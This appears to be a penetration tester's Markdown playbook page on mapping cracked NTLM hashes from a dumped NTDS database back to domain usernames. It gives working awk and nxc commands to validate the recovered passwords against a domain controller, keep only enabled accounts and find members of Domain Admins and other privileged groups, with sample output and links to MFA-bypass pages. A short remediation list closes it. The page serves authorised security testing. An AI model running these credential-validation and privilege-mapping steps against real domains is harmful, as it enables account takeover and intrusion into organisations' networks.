# NTDS Account Mapping

**MITRE:** [T1003.003 - OS Credential Dumping: NTDS](https://attack.mitre.org/techniques/T1003/003/)  
**Phase:** Credential Access  
**Auth Required:** No (offline — post-dump)  
**Tags:** #credential-access #ntds #awk #account-mapping

---

## Summary
After cracking NTLM hashes, map cracked hashes back to domain account usernames and validate which accounts are enabled/active. Separate workflows for cross-referencing privileged group membership and confirming live credentials via network authentication.

## Mechanism
- **Protocol:** Offline awk join + LDAP/SMB validation
- **Function:** Hash-to-username correlation, enabled account filtering, group membership cross-reference
- **Effect:** Produces confirmed username:password pairs for enabled domain accounts

## Commands
```bash
# Map cracked hashes back to usernames
awk -F: 'NR==FNR{a[$1]=$2; next} ($4 in a){print $1":"a[$4]}' \
  cracked_pairs.txt ntds_filtered.txt > accounts_cracked.txt

# Split into separate username and password files
cut -d: -f1 accounts_cracked.txt | sed 's/^[^\\]*\\//' > usernames.txt
cut -d: -f2 accounts_cracked.txt > passwords.txt

# Validate credentials are live against DC
nxc ldap <DC_IP> -d <DOMAIN> \
  -u usernames.txt -p passwords.txt \
  --no-bruteforce --continue-on-success

# Get enabled domain users only
nxc ldap <DC_IP> -u <user> -p <pass> --active-users > enabled_users.txt

# Cross-reference cracked accounts against enabled users
grep -if usernames.txt enabled_users.txt > confirmed_active_cracked.txt

# Check high-privilege group membership
for group in "Domain Admins" "Enterprise Admins" "Schema Admins" "Backup Operators" "Account Operators"; do
    echo "=== $group ==="
    nxc smb <DC_IP> -u <user> -p <pass> --groups "$group"
done | grep "Member" | awk -F'\' '{print tolower($2)}' | sort -u > highpriv_members.txt

# Cross-reference cracked accounts against high-priv groups
grep -if highpriv_members.txt usernames.txt

# Check for service accounts in cracked list
grep -iE "^svc|svc_|_svc|admin|adm|service" usernames.txt
```

## Expected Output
```
# nxc validation output:
LDAP  10.0.0.10  389  DC01  [+] DOMAIN\jsmith:Summer2023!
LDAP  10.0.0.10  389  DC01  [-] DOMAIN\bwilliams:Welcome1 STATUS_LOGON_FAILURE
LDAP  10.0.0.10  389  DC01  [+] DOMAIN\tjones:Fall2022!

# accounts_cracked.txt format:
DOMAIN\jsmith:Summer2023!
DOMAIN\tjones:Fall2022!
```

## Notes
- `--no-bruteforce` is critical — pairs each username with its corresponding password line; without it nxc tries every password against every user = lockouts
- `--continue-on-success` required to see all results, not just first hit
- Check lockout policy before bulk validation: `nxc smb <DC> -u <user> -p <pass> --pass-pol`
- Domain prefix in accounts_cracked.txt needs stripping before passing to nxc: `sed 's/^[^\\]*\\//'`
- Enabled DA with cracked password = Critical; disabled account = Medium

## Relay / Follow-On Attack Path
- Test MFA bypass on confirmed creds: [[mfa-bypass-legacy-auth]]
- Check lockout status post-validation: [[account-lockout-check]]

## Remediation
- Force password reset for all cracked accounts immediately
- Review and rotate service account passwords
- Implement privileged account monitoring/alerting

## Related
- [[ntlm-hash-cracking]]
- [[account-lockout-check]]
- [[mfa-bypass-legacy-auth]]
- [[domain-password-policy]]
